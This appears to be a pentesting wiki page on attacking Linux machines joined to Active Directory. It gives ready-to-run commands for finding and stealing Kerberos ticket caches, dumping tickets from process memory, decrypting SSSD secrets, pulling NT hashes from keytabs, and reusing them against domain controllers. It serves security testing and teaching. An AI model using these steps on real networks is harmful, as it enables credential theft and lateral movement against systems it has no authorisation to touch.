# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

A linux machine can also be present inside an Active Directory environment.

A Linux machine inside an AD can **store Kerberos material locally**: user ccaches, machine/service keytabs, and SSSD-managed secrets. These artefacts can usually be reused as any other Kerberos credential. In order to read most of them you will need to be the user owner of the ticket or **root** on the machine.

## Enumeration

### AD enumeration from linux

If you have access over an AD in linux (or bash in Windows) you can try [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) to enumerate the AD.

You can also check the following page to learn **other ways to enumerate AD from linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA is an open-source **alternative** to Microsoft Windows **Active Directory**, mainly for **Unix** environments. It combines a complete **LDAP directory** with an MIT **Kerberos** Key Distribution Center for management akin to Active Directory. Utilizing the Dogtag **Certificate System** for CA & RA certificate management, it supports **multi-factor** authentication, including smartcards. SSSD is integrated for Unix authentication processes. Learn more about it in:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

Before touching tickets, identify **how the host was joined to AD** and **where Kerberos material is really stored**. On modern Linux hosts this is commonly handled by `realmd` + `adcli` + `sssd`, not just flat files in `/tmp`:

```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```

This quickly tells you whether the host trusts AD, whether SSSD is caching identities or tickets, and whether **machine/service keytabs** or **KCM secrets** are available for abuse.

## Playing with tickets

### Pass The Ticket

In this page you are going to find different places were you could **find kerberos tickets inside a linux host**, in the following page you can learn how to transform this CCache tickets formats to Kirbi (the format you need to use in Windows) and also how to perform a PTT attack:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

If you want the **Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, etc.), check the dedicated page:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### CCACHE ticket reuse from /tmp

CCACHE files are binary formats for **storing Kerberos credentials**. `FILE:/tmp/krb5cc_%{uid}` is still common, but modern Linux deployments also use `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, or `KCM:%{uid}`. Check the **`KRB5CCNAME`** environment variable and the `default_ccache_name` setting before assuming tickets live in `/tmp`.

```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### CCACHE ticket reuse from keyring

**Kerberos tickets stored in a process's memory can be extracted**, particularly when the machine's ptrace protection is disabled (`/proc/sys/kernel/yama/ptrace_scope`). A useful tool for this purpose is found at [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), which facilitates the extraction by injecting into sessions and dumping tickets into `/tmp`.

To configure and use this tool, the steps below are followed:

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

This procedure will attempt to inject into various sessions, indicating success by storing extracted tickets in `/tmp` with a naming convention of `__krb_UID.ccache`.

### CCACHE ticket reuse from SSSD KCM

SSSD maintains a copy of the database at the path `/var/lib/sss/secrets/secrets.ldb`. The corresponding key is stored as a hidden file at the path `/var/lib/sss/secrets/.secrets.mkey`. By default, the key is only readable if you have **root** permissions.

Invoking **`SSSDKCMExtractor`** with the --database and --key parameters will parse the database and **decrypt the secrets**.

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

The **credential cache Kerberos blob can be converted into a usable Kerberos CCache** file that can be passed to Mimikatz/Rubeus.

### Quick keytab triage

```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```

### Extract accounts from /etc/krb5.keytab

Service account keys, essential for services operating with root privileges, are securely stored in **`/etc/krb5.keytab`** files. These keys, akin to passwords for services, demand strict confidentiality.

To inspect the keytab file's contents, **`klist`** can be employed. On Linux, `klist -k -K -e` prints the principals, key version numbers, encryption types, and raw key material. If the key type is **23 / RC4-HMAC**, the key value is also the **NT hash** of that principal.

```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```

For Linux users, **`KeyTabExtract`** offers functionality to extract the RC4 HMAC hash, which can be leveraged for NTLM hash reuse. Note that this only helps when the keytab still contains **etype 23 / RC4-HMAC** material. In **AES-only** environments you may not get a reusable NT hash, but you can still authenticate directly with the keytab via Kerberos.

```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```

On macOS, **`bifrost`** serves as a tool for keytab file analysis.

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

Utilizing the extracted account and hash information, connections to servers can be established using tools like **`NetExec`**.

```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```

### Reuse the machine account from `/etc/krb5.keytab`

On `realmd`/`adcli`/`sssd` joined systems, `/etc/krb5.keytab` usually contains the **computer account** and one or more **host/service principals**. If you have **root**, don't just dump it: use one of the principals listed by `klist -k` to request a TGT and operate as the Linux host itself.

```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```

This is especially useful when the **computer object** itself has delegated rights in AD or when the host is allowed to retrieve other secrets such as a **gMSA**.

### Reuse stolen Kerberos material with Linux-first AD tooling

Once you have a valid `ccache` or a usable keytab, you can operate against AD **directly from Linux** without converting everything to Windows formats first. Many modern tools accept `KRB5CCNAME` / Kerberos auth natively:

```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
  --target 'WEB01$' --action list
```

This is a good bridge between **Linux post-exploitation** and **AD object abuse**. For the object-level abuse paths themselves, check:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

Recent Linux deployments can consume **Managed Service Accounts** directly from AD. In practice this means that, after compromising a Linux server, you may find not only the host keytab but also **service-specific keytabs** generated from a gMSA. Common places to inspect are `/etc/gmsad.conf`, deployment-specific config files, and additional `*.keytab` files under `/etc`.

```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```

This gives you a reusable Kerberos identity for the SPNs bound to that gMSA **without touching any Windows endpoint**. For **domain-side** gMSA/dMSA abuse after higher privileges in AD, check:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}


